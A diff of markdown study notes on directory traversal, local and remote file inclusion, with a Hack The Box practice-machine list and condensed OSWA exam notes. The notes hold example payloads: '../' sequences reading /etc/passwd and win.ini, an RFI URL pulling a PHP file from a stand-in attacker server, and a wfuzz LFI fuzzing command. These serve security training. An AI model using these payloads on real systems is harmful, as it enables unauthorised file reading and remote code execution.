@@ -2,10 +2,10 @@
 
 # Directory Traversal
 
-### Training Resources
+## Training Resources
 ---
 
-**Courses**
+### Courses
 
 *Free*
 - [PortSwigger Academy - Path Traversal](https://portswigger.net/web-security/file-path-traversal)
@@ -17,90 +17,90 @@
 
 #
 
-#### HTB Machines
-*These machines are tagged as containing Directory Traversal by HTB, the difficulty refers to the box as a whole and not necessarily the Directory Traversal element.*
+### Hack The Box Machines
+*These machines are tagged as containing Directory Traversal/LFI/RFI by HTB, the difficulty refers to the box as a whole and not necessarily the Directory Traversal/LFI/RFI element.*
 
-| Machine Name | Difficulty | Verified Directory Traversal | WriteUp | Comments |
-| -- | -- | -- | -- | -- |
-| GetLab | Very Easy | No | [My Writeup](https://github.com/ThomasRose23/htb_writeups/blob/main/boxes/getlab.md) | Directory Traversal - Involves manual directory traversal if you avoid the public exploit. |
-| Archive | Easy | No | | Directory Traversal |
-| Trick | Easy | No | | LFI |
-| Topology | Easy | No | | LFI / Diretory Traversal |
-| Bagel | Easy | No | | LFI |
-| Backdoor | Easy | No | | Directory Traversal |
-| Tabby | Easy | No | | LFI |
-| Bookworm | Easy | No | | LFI |
-| BigHead | Easy | No | | LFI |
-| Stocker | Easy | No | | Directory Traversal |
-| Mailing | Easy | No | | DIrectory Traversal |
-| Llama | Easy | No | | LFI |
-| LaCasaDePapel | Easy | No | | LFI |
-| Laboratory | Easy | No | | Directory Traversal |
-| Inject | Easy | No | | LFI |
-| Haystack | Easy | No | | LFI |
-| GreenHorn | Easy | No | | RFI |
-| Gem | Easy | No | | LFI |
-| FriendZone | Easy | No | | LFI |
-| ServMon | Easy | No | | LFI  |
-| Repetitive | Easy | No | | Diretory Traversal |
-| Pilgrimage | Easy | No | | LFI |
-| Paper | Easy | No | | Directory Traversal |
-| OpenSource | Easy | No | | Directory Traversal |
-| OpenAdmin | Easy | No | | LFI / Directory Traversal |
-| Poison | Medium | No | | LFI |
-| OnlyForYou | Medium | No | | LFI |
-| Nineveh | Medium | No | | LFI |
-| Format | Medium | No | | LFI |
-| Resource | Medium | No | | LFI |
-| Faculty | Medium | No | | LFI |
-| Encoding | Medium | No | | LFI |
-| Sniper | Medium | No | | LFI / RFI |
-| StreamIO | Medium | No | | LFI / RFI |
-| Devzat | Medium | No | | LFI |
-| DevOps | Medium | No | | LFI |
-| CrimeStoppers | Medium | No | | LFI |
-| Cerberus | Medium | No | | LFI |
-| Beep | Medium | No | | LFI |
-| Awkward | Medium | No | | LFI |
-| Ambassador | Medium | No | | Directory Traversal |
-| Writer | Medium | No | | LFI |
-| Zipping | Medium | No | | LFI |
-| Waldo | Medium | No | | Directory Traversal |
-| UpDown | Medium | No | | LFI |
-| Unicode | Medium | No | | LFI |
-| Unattended | Medium | No | | LFI / Diretory Traversal |
-| Timing | Medium | No | | LFI |
-| TartarSauce | Medium | No | | RFI |
-| Ghoul | Hard | No | | Directory Traversal |
-| Flight | Hard | No | | RFI |
-| BroScience | Hard | No | | LFI |
-| Clicker | Hard | No | | Directory Traversal |
-| Cybermonday | Hard | No | | LFI |
-| EarlyAccess | Hard | No | | Directory Traversal |
-| Download | Hard | No | | LFI |
-| ForwardSlash | Hard | No | | LFI / Directory Traversal |
-| FormulaX | Hard | No | | LFI |
-| Intuition | Hard | No | | LFI |
-| Monitors | Hard | No | | LFI |
-| Moderators | Hard | No | | LFI |
-| OverGraph | Hard | No | | LFI |
-| Player | Hard | No | | LFI |
-| Pikaboo | Hard | No | | LFI |
-| Patents | Hard | No | | LFI |
-| Reel2 | Hard | No | | Diretory Traversal |
-| RE | Hard | No | | Diretory Traversal |
-| Proper | Hard | No | | RFI |
-| Pollution | Hard | No | | LFI |
-| Seventeen | Hard | No | | LFI |
-| Spooktrol | Hard | No | | Directory Traversal |
-| Snoopy | Hard | No | | LFI |
-| Smasher | Insane | No | | LFI |
-| Response | Insane | No | | LFI |
-| PikaTwoo | Insane | No | | LFI |
-| Fingerprint | Insane | No | | LFI / Directory Traversal |
-| Fatty | Insane | No | | Directory Traversal |
-| Blunder | Insane | No | | Directory Traversal |
-| Breadcrumbs | Insane | No | | Directory Traversal |
+| Machine Name | Difficulty | Completed |
+| -- | -- | -- |
+| GetLab | Very Easy | |
+| Archive | Easy | |
+| Trick | Easy | |
+| Topology | Easy | |
+| Bagel | Easy | |
+| Backdoor | Easy | |
+| Tabby | Easy | |
+| Bookworm | Easy | |
+| BigHead | Easy | |
+| Stocker | Easy | |
+| Mailing | Easy | |
+| Llama | Easy | |
+| LaCasaDePapel | Easy | |
+| Laboratory | Easy | |
+| Inject | Easy | |
+| Haystack | Easy | |
+| GreenHorn | Easy | |
+| Gem | Easy | |
+| FriendZone | Easy | |
+| ServMon | Easy | |
+| Repetitive | Easy | |
+| Pilgrimage | Easy | |
+| Paper | Easy | |
+| OpenSource | Easy | |
+| OpenAdmin | Easy | |
+| Poison | Medium | |
+| OnlyForYou | Medium | |
+| Nineveh | Medium | |
+| Format | Medium | |
+| Resource | Medium | |
+| Faculty | Medium | |
+| Encoding | Medium | |
+| Sniper | Medium | |
+| StreamIO | Medium | |
+| Devzat | Medium | |
+| DevOps | Medium | |
+| CrimeStoppers | Medium | |
+| Cerberus | Medium | |
+| Beep | Medium | |
+| Awkward | Medium | |
+| Ambassador | Medium | |
+| Writer | Medium | |
+| Zipping | Medium | |
+| Waldo | Medium | |
+| UpDown | Medium | |
+| Unicode | Medium | |
+| Unattended | Medium | |
+| Timing | Medium | |
+| TartarSauce | Medium | |
+| Ghoul | Hard | |
+| Flight | Hard | |
+| BroScience | Hard | |
+| Clicker | Hard | |
+| Cybermonday | Hard | |
+| EarlyAccess | Hard | |
+| Download | Hard | |
+| ForwardSlash | Hard | |
+| FormulaX | Hard | |
+| Intuition | Hard | |
+| Monitors | Hard | |
+| Moderators | Hard | |
+| OverGraph | Hard | |
+| Player | Hard | |
+| Pikaboo | Hard | |
+| Patents | Hard | |
+| Reel2 | Hard | |
+| RE | Hard | |
+| Proper | Hard | |
+| Pollution | Hard | |
+| Seventeen | Hard | |
+| Spooktrol | Hard | |
+| Snoopy | Hard | |
+| Smasher | Insane | |
+| Response | Insane | |
+| PikaTwoo | Insane | |
+| Fingerprint | Insane | |
+| Fatty | Insane | |
+| Blunder | Insane | |
+| Breadcrumbs | Insane | |
 
 ### Other Resources
 ---
@@ -125,3 +125,35 @@
 - [PATT - Linux Files of Interest](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Intruders/Linux-files.txt)
 - [PATT - Windows Files of Interest](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Intruders/LFI-WindowsFileCheck.txt)
 #
+
+## Condensed Notes
+This is a condensed version of the notes I used during OSWA and are by no means complete. Make your own notes and methodology, building off these basic steps. 
+
+Firstly some definitions related to "Path Manipulation" vulnerabilities:
+**Directory Listing:** The ability to view directories you shouldn't have access to.
+**Directory Traversal (Path Traversal):** The ability to view files in directories you shouldn't have access to. 
+**Local File Inclusion:** The ability to execute a file on the target system that you shouldn't be able to or have access to. 
+**Remote File Inclusion:** The ability to get the target to execute a file from a remote location, eg. a malicious attack server.
+
+- Look for suggestive parameters hinting at interactions with a file:
+```bash
+https://insecure-website.com/loadImage?filename=123.png
+```
+- Try to access files locally (LFI).
+```bash
+# Linux
+https://insecure-website.com/loadImage?filename=../../../etc/passwd
+
+# Windows
+https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini
+```
+- Try to access remote files (RFI) - With server set up on your attack machine.
+```bash
+http://example.com/index.php?filename=http://attack-server.com/welcome.php
+```
+- Try encoding the payloads.
+- Use automated tools such as Wfuzz:
+```bash
+wfuzz -c --hh <normal-reponse-size> --hc 404 -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt http://example/file.php?path=FUZZ
+```
+- Burp Suite Scans will attempt to discover this type of vulnerability. 
